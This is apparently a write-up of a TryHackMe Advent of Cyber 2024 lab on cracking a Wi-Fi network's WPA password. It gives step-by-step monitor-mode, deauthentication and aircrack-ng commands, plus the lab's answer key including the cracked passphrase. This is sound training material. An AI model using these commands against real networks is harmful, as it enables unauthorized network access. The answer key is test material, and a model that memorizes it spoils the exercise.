# Advent of Cyber 2024 - Day 11: If you'd like to WPA, press the star key!

{% embed url="https://tryhackme.com/room/adventofcyber2024" %}

## Overview & Investigation Walkthrough

1. What is the BSSID of our wireless interface?

   To find the BSSID of our wireless interface we can use `iw dev`.

   ![Bssid](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_11_Bssid.png)

   ><details><summary>Click for answer</summary>02:00:00:00:02:00</details>

2. What is the SSID and BSSID of the access point? Format: SSID, BSSID

   To find the SSID and BSSID of the access point we can use: `sudo iw dev wlan2 scan`.

   ![Ssid](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_11_Ssid.png)

   ><details><summary>Click for answer</summary>MalwareM_AP, 02:00:00:00:00:00</details>

3. What is the BSSID of the wireless interface that is already connected to the access point?

   To get the BSSID of the connected client, we can use `airodump-ng`. We need to have it listen on wlan2.

   We could manually put the access point into monitor mode, but `airodump-ng` can to it automatically.

   ```cmd
   sudo ip link set dev wlan2 down
   sudo iw dev wlan2 set type monitor
   sudo ip link set dev wlan2 up
   ```

   ```cmd
   sudo airodump-ng wlan2
   ```

   AIRODUMP

   After a while, a client should pop-up.

   ><details><summary>Click for answer</summary>02:00:00:00:01:00</details>

4. What is the PSK after performing the WPA cracking attack?

   To start monitoring more specifically we can use:

   ```cmd
   sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
   ```

   ![Client](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_11_Client.png)

   Next step is to disconnect the client whilst monitoring traffic.

   ```cmd
   sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
   ```

   ![Disconnect](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_11_Disconnect.png)

   ![Captured](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_11_Captured.png)

   Now we can crack this handshake using `aircrack-ng`.

   ```cmd
   sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap 
   ```

   ![Password](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_11_Password.png)

   ><details><summary>Click for answer</summary>fluffy/champ24</details>

5. If you enjoyed this task, feel free to check out theNetworkingmodule.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What is the BSSID of our wireless interface? | `02:00:00:00:02:00` |
| What is the SSID and BSSID of the access point? Format: SSID, BSSID | `MalwareM_AP, 02:00:00:00:00:00` |
| What is the BSSID of the wireless interface that is already connected to the access point? | `02:00:00:00:01:00` |
| What is the PSK after performing the WPA cracking attack? | `fluffy/champ24` |

> **Note:** Flags are redacted as `flag{hidden}` in accordance with responsible disclosure guidelines. The step-by-step commands above provide the verified reproduction path.
